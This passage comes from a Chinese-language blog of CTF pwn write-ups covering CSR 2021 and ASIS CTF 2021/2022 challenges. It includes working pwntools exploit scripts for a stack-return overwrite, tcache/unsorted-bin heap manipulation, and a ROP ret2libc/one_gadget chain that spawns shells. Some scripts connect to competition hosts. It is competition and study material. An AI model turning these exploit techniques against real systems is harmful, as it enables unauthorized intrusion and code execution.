class="hljs-string">&quot;ud2;&quot;</span> ::<br>            :);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="CSR-2021"><a href="#CSR-2021" class="headerlink" title="CSR 2021"></a>CSR 2021</h1><h2 id="getstat"><a href="#getstat" class="headerlink" title="getstat"></a>getstat</h2><blockquote><p>CSR 2021</p><p>è¿™ä¸ªæ¯”èµ›çš„pwné¢˜å¥½å°‘, å°±åšä¸ªæ ·å­. åè€Œæ˜¯cry(???)å’Œethereumè¾ƒå¤š. è€Œrevè¿™ç§è¿˜æœ‰ä¸€é¢˜æ˜¯unityèƒŒæ™¯, è¿™ä¸ªä¹Ÿæ˜¯ä¸ä¼šçš„â€¦..</p><p>ä¸è¿‡çœ‹äº†åˆ«äººçš„wpè¿˜æ˜¯æŒºæœ‰è¶£çš„. </p></blockquote><p>æ¯”è¾ƒç®€å•, ç›´æ¥æä¾›shell()å‡½æ•°, è€Œä¸”PIE. æœ‰canary, ä½†æ˜¯æ²¡æœ‰æ–¹æ³•å¯ä»¥leak. äºæ˜¯å°±å¾—ç»•è¿‡. è¦†ç›–è¿”å›åœ°å€.</p><p>ä¸»è¦çš„é—®é¢˜æ˜¯æ— ç¬¦å·æ•°è¾“å…¥åŠ ä¸Šè¿™æ®µ:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401109                 lea     rax, [rdx*8]<br>.text:0000000000401111                 and     rax, 0FFFFFFFFFFFFFFF0h<br>.text:0000000000401115                 sub     rsp, rax<br></code></pre></div></td></tr></table></figure><p>å¦‚æœrdxæ˜¯è´Ÿæ•°(ä¸€è‡´æ€§), é‚£ä¹ˆrspå‡å»è´Ÿæ•°å°±ä¼šå¢åŠ , å¯¼è‡´æ ˆ<strong>æ”¶ç¼©</strong>. </p><p>ç›´æ¥æŠŠrspæ”¶ç¼©åˆ°è¿”å›åœ°å€é™„è¿‘, æ­¤æ—¶å†è¦†ç›–åœ°å€å³å¯. </p><p>å”¯ä¸€ä¸€ä¸ªæ–°é—®é¢˜æ˜¯åœ¨pythonä¸­æŠŠæ•´æ•°packæˆæµ®ç‚¹æ•°. æ–°çš„æ–¹æ³•å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">Functions to convert between Python values <span class="hljs-keyword">and</span> C structs.<br>The optional first format <span class="hljs-keyword">char</span> indicates byte order, size <span class="hljs-keyword">and</span> alignment:<br>    @: native order, <span class="hljs-function">size &amp; <span class="hljs-title">alignment</span> <span class="hljs-params">(<span class="hljs-keyword">default</span>)</span></span><br><span class="hljs-function">    </span>=: native order, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &lt;: little-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &gt;: big-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    !: same as &gt;<br><br>The remaining chars indicate types of args <span class="hljs-keyword">and</span> must match exactly;<br>these can be preceded by a decimal repeat count:<br>    x: <span class="hljs-function">pad <span class="hljs-title">byte</span> <span class="hljs-params">(no data)</span></span>; c:<span class="hljs-keyword">char</span>; b:<span class="hljs-keyword">signed</span> byte; B:<span class="hljs-keyword">unsigned</span> byte;<br>    ?: <span class="hljs-built_in">_Bool</span> (<span class="hljs-keyword">requires</span> C99; <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">char</span> is used instead)<br>    h:<span class="hljs-keyword">short</span>; H:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>; i:<span class="hljs-keyword">int</span>; I:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>;<br>    l:<span class="hljs-keyword">long</span>; L:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>; f:<span class="hljs-keyword">float</span>; d:<span class="hljs-keyword">double</span>; e:half-<span class="hljs-keyword">float</span>.<br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(preceding decimal count indicates length)</span>:</span><br><span class="hljs-function">    s:<span class="hljs-title">string</span> <span class="hljs-params">(<span class="hljs-built_in">array</span> of <span class="hljs-keyword">char</span>)</span></span>; p: <span class="hljs-function">pascal <span class="hljs-title">string</span> <span class="hljs-params">(with count byte)</span>.</span><br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(only available in native format)</span>:</span><br><span class="hljs-function">    n:<span class="hljs-keyword">ssize_t</span></span>; N:<span class="hljs-keyword">size_t</span>;<br>    P:an integer type that is wide enough to hold a pointer.<br><span class="hljs-function">Special <span class="hljs-title">case</span> <span class="hljs-params">(<span class="hljs-keyword">not</span> in native mode unless <span class="hljs-string">&#x27;long long&#x27;</span> in platform C)</span>:</span><br><span class="hljs-function">    q:<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span></span>; Q:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span><br>Whitespace between formats is ignored.<br></code></pre></div></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br>  <br>addr = <span class="hljs-number">0x401360</span><br><br>r = process(<span class="hljs-string">&#x27;./getstat&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;-10&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(iToF(addr)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.clean())<br></code></pre></div></td></tr></table></figure><hr><p>SSE instructions: </p><ul><li></li></ul><p>æ³¨æ„çš„ç‚¹:</p><ul><li>åˆ†æ”¯åˆ†æ, å°±æ¯”å¦‚è¿™ä¸ªè¾“å…¥ä¸ç¬¦åˆæµ®ç‚¹æ•°çš„è¾“å…¥å°±ä¼šbreak. </li><li>æ— ç¬¦å·å’Œæœ‰ç¬¦å·è¿ç®—çš„ä¸€è‡´æ€§â€¦</li></ul><h2 id="CSRunner"><a href="#CSRunner" class="headerlink" title="CSRunner"></a>CSRunner</h2><p>å›¾ä¸€ä¹.</p><ul><li><a href="https://en.wikipedia.org/wiki/Common_Language_Infrastructure">Common Language Infrastructure</a> (CLI)</li><li>IL2CPP</li></ul><h1 id="ASIS-CTF-2021"><a href="#ASIS-CTF-2021" class="headerlink" title="ASIS CTF 2021"></a>ASIS CTF 2021</h1><h2 id="Justpwnit"><a href="#Justpwnit" class="headerlink" title="Justpwnit"></a>Justpwnit</h2><p>no canary PIE. </p><p>è¾“å…¥ä¸€ä¸ªè´Ÿæ•°, ç„¶åè¦†ç›–rbpä¸ºå †æŒ‡é’ˆ, æœ€ç»ˆstack pivotåˆ°heapä¸Š, æœ€åæ‰§è¡Œ<code>exec(&quot;/bin/sh\x00&quot;, NULL, NULL)</code> </p><p>è¿˜åœ¨çº ç»“system/read&amp;write/sendfileçš„æ—¶å€™å‘ç°è¿˜å¯ä»¥ç”¨<code>mov qword ptr [rax], rsi ; ret</code>æ¥æŠŠ/bin/shå†™å…¥bssæ®µâ€¦.</p><h2 id="Abbr"><a href="#Abbr" class="headerlink" title="Abbr"></a>Abbr</h2><blockquote><p>åŒä¸Š, åˆ†æ•°71, åº”è¯¥æ˜¯éš¾ä¸€ç‚¹ç‚¹</p></blockquote><ul><li><code>strncasecmp</code>: compare two strings ignoring case. </li></ul><p>æ³¨æ„ä¸‹stack pivotè¿˜å¯ç”¨xchgæŒ‡ä»¤â€¦. å¯ä»¥åˆšå¥½æ‰¾åˆ°xchg esp, eax. åˆå› ä¸ºPIEå·²å…³, æ‰€ä»¥4å­—èŠ‚èƒ½å¤Ÿè£…ä¸‹bsså’Œheapæ®µçš„åœ°å€. </p><p>ä¸è¿‡çœ‹åˆ°å¦ä¸€ä¸ªexpé‡Œç¡®å®ç»•äº†ä¸€å¤§åœˆä½¿ç”¨äº†printfçš„ä»»æ„è¯»èƒ½åŠ›leakå‡ºåœ°å€. æœ‰ç‚¹å¤æ‚äº†. </p><h2 id="strvec"><a href="#strvec" class="headerlink" title="strvec"></a>strvec</h2><blockquote><p>github <a href="https://github.com/kam1tsur3/2021_CTF/tree/master/asis/pwn/strvec">src</a>, 114 points</p></blockquote><p>æ‰¾æ¼æ´çš„è¿‡ç¨‹å®Œå…¨å°±æ˜¯ä¸€ä¸ªäººè„‘fuzzingâ€¦</p><p>ä¿æŠ¤å…¨å¼€. å¤§ä½“æ€è·¯ä»æ¥è‡ªåˆ«äººçš„wpâ€¦.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>å¥½äº†, æ˜¯ä¸‹é¢ä»£ç çš„ä¸€ä¸ªæ•´æ•°æº¢å‡º, å¯ä»¥åšåˆ°ä¸€ä¸ªå¾ˆå¤§çš„vec-&gt;sizeä»¥åŠå¾ˆå°çš„malloc(size)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-built_in">vector</span> *<span class="hljs-title">vector_new</span><span class="hljs-params">(<span class="hljs-keyword">int</span> nmemb)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (nmemb &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">vector</span>) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span>*) * nmemb;    <span class="hljs-comment">//8+8*n = 8*(n+1)</span><br>                                                        <span class="hljs-comment">//0x40000004</span><br>  <span class="hljs-built_in">vector</span> *vec = (<span class="hljs-built_in">vector</span>*)<span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> (!vec)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">memset</span>(vec, <span class="hljs-number">0</span>, size);<br>  vec-&gt;size = nmemb;<br>  <span class="hljs-keyword">return</span> vec;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™æ ·çš„è¯getå’Œsetä¸¤ä¸ªå‡½æ•°åœ¨ä¸€å®šèŒƒå›´å†…éƒ½æ²¡æœ‰äº†é™åˆ¶, ä¸è¿‡åªèƒ½get heapæ®µä¹‹åçš„åœ°å€åŒºåŸŸ. å¥½åƒåªæœ‰heapäº†â€¦</p><h3 id="Leak-heap-address"><a href="#Leak-heap-address" class="headerlink" title="Leak heap address"></a>Leak heap address</h3><p>åˆ°ç°åœ¨getäº†ä¸€ä¸ªarbitrary read. å¯ä»¥leakä¸€ä¸‹å †åœ°å€, æ–¹æ³•æ˜¯é€šè¿‡getå·²é‡Šæ”¾çš„chunkçš„tcacheé“¾è¡¨æŒ‡é’ˆ. </p><p>ç„¶åå‘¢?ä¸çŸ¥é“äº†, å¡äº†åŠå¤©, æ²¡æƒ³åˆ°ç»éªŒæ˜¯å¦‚æ­¤çš„ä¸è¶³, çŸ¥é“ä¸‹ä¸€æ­¥æ˜¯leak libcè¿˜æ˜¯æƒ³ä¸å‡ºæ¥æ€ä¹ˆåš. </p><p>å¥½å§ç°åœ¨æƒ³å‡ºæ¥äº†, å°±æ˜¯é ä¼ªé€ ä¸€ä¸ªchunkç„¶åå†é‡Šæ”¾åŠ å…¥unsortedbinä¸­å°±å¯ä»¥è¯»å–fdæŒ‡é’ˆ, ä»è€Œè·å¾—libc_base.</p><h3 id="Arbitrary-write"><a href="#Arbitrary-write" class="headerlink" title="Arbitrary write"></a>Arbitrary write</h3><p>æ–¹æ³•æ˜¯é‡Šæ”¾tcache struct, æ”¾åˆ°unsorted binä¸­, æ–¹æ³•æ˜¯å…ˆå¡«æ»¡0x290å¤§å°çš„tcacheé“¾è¡¨, ä½¿å¾—å†æ¬¡free tcache structçš„æ—¶å€™å¯ä»¥è¿›å…¥unsorted bin, è¿›è€Œè®©fdå’ŒbkæŒ‡é’ˆè¦†ç›–0x30çš„countå˜æˆä¸€ä¸ªå¾ˆå¤§çš„æ•°å€¼, ä½¿å¾—å¯ä»¥åœ¨tcacheé“¾ä¸Šmallocä»»æ„æ•°é‡çš„ä¼ªé€ çš„tcache fdæŒ‡é’ˆ, æœ€ç»ˆåˆ†é…åˆ°<code>__malloc_hook</code>, å®ç°ä¿®æ”¹ä¸‹ä¸€æ¬¡mallocæ—¶çš„æµç¨‹æ§åˆ¶.</p><p>å¡äº†ä¸€ä¼šå„¿çš„æ˜¯å·®ç‚¹å¿˜äº†é‡Šæ”¾0x420çš„chunkçš„æ—¶å€™ä¼šå°è¯•å‰ååˆå¹¶, è€Œ0x421ä¼šé˜»æ­¢åå‘åˆå¹¶, æ­¤æ—¶å¿…é¡»è®¾ç½®å¥½nextchunkçš„nextsize_inuseä½, ä»¥é˜»æ­¢å‰å‘åˆå¹¶. </p><h3 id="Pop-a-shell"><a href="#Pop-a-shell" class="headerlink" title="Pop a shell"></a>Pop a shell</h3><p>å¯ä»¥ä½¿ç”¨ROPçš„æ–¹å¼, ä¸è¿‡æœ‰canaryçš„é™åˆ¶, åœ¨æ­¤ä¹‹å‰è¿˜è¦çŸ¥é“stackå’Œcanaryçš„å€¼. </p><p>æ›´ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨one_gadgetä¸€ä¸€æ£€æŸ¥æœ‰æ— æ»¡è¶³å¯¹åº”æ¡ä»¶çš„gadget, è¿™æ ·åªè¦è¦†ç›–malloc_hookåˆ°å¯¹åº”gadgetåœ°å€å³å¯.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./strvec.elf64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(binary, aslr=<span class="hljs-literal">False</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx =&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    ru(<span class="hljs-string">b&#x27;-&gt; &#x27;</span>)<br>    data = p.recvline(<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;[undefined]&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        log.error(<span class="hljs-string">&#x27;get idx:&#123;idx&#125; [undefined]&#x27;</span>)<br>    data = u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span>, data:<span class="hljs-built_in">bytes</span>=<span class="hljs-string">b&#x27;\x00&#x27;</span></span>):</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx =&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;data = &#x27;</span>, data[:-<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">0x20</span> <span class="hljs-keyword">else</span> data+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    rl()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initial</span>():</span><br>    sl(<span class="hljs-string">b&#x27;Yogdzewa&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x40000004</span>))<br><br><br>initial()<br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span>)<br>chunk1_addr = get(<span class="hljs-number">5</span>)<br>log.success(<span class="hljs-string">f&#x27;data is: 0x<span class="hljs-subst">&#123;chunk1_addr:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x421</span>]))<br><span class="hljs-built_in">set</span>(<span class="hljs-number">7</span>, flat([chunk1_addr+<span class="hljs-number">0x40</span>, chunk1_addr+<span class="hljs-number">0x40</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        log.success(<span class="hljs-string">f&#x27;idx is: <span class="hljs-subst">&#123;<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">set</span>(<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">set</span>(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#the nextchunk header set</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">1</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br><br>gdb.attach(p)<br><span class="hljs-comment">#this will malloc a chunk first, so that puts a chunk between</span><br><span class="hljs-comment">#top chunk and freed one. Will not get into **consolidate forward**</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br>fd_ptr = get(<span class="hljs-number">6</span>)<br>log.success(<span class="hljs-string">f&#x27;fd_ptr is: 0x<span class="hljs-subst">&#123;fd_ptr:x&#125;</span>&#x27;</span>)<br>libc.address = fd_ptr - <span class="hljs-number">0x1ebbe0</span><br>log.success(<span class="hljs-string">f&#x27;libc_base is: 0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># work-in-progress</span><br><br><br><br><br><br>itt()<br></code></pre></div></td></tr></table></figure><h1 id="ASIS-CTF-2022-QUAL"><a href="#ASIS-CTF-2022-QUAL" class="headerlink" title="ASIS CTF 2022 QUAL"></a>ASIS CTF 2022 QUAL</h1><h2 id="babyscan-1"><a href="#babyscan-1" class="headerlink" title="babyscan-1"></a>babyscan-1</h2><p>éé¢„æœŸè§£, å› ä¸º<code>%0s</code>ç›¸å½“äºä¸é™åˆ¶é•¿åº¦. è€Œä¸”amllocä¸æ”¹å˜rsp, å°±æ˜¯ç›´æ¥å¯¹æ ˆè¿›è¡Œè¦†ç›–. æ¥è‡ªr3kapig. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>r = remote(<span class="hljs-string">&#x27;65.21.255.31&#x27;</span>,<span class="hljs-number">13370</span>)<br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br><br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>pop_rdi = <span class="hljs-number">0x0000000000401433</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&quot;alarm&quot;</span>])+p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])+p64(<span class="hljs-number">0x401130</span>) <span class="hljs-comment"># _start</span><br>r.sendline(payload)<br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))-libc.sym[<span class="hljs-string">&quot;alarm&quot;</span>]<br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>ogg = libc_base+<span class="hljs-number">0xe3b01</span><span class="hljs-comment"># getted by one_gadget</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(ogg))<br><br><br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="babyscan-2"><a href="#babyscan-2" class="headerlink" title="babyscan-2"></a>babyscan-2</h2><p>src: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> size[<span class="hljs-number">16</span>], fmt[<span class="hljs-number">8</span>], *buf;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span 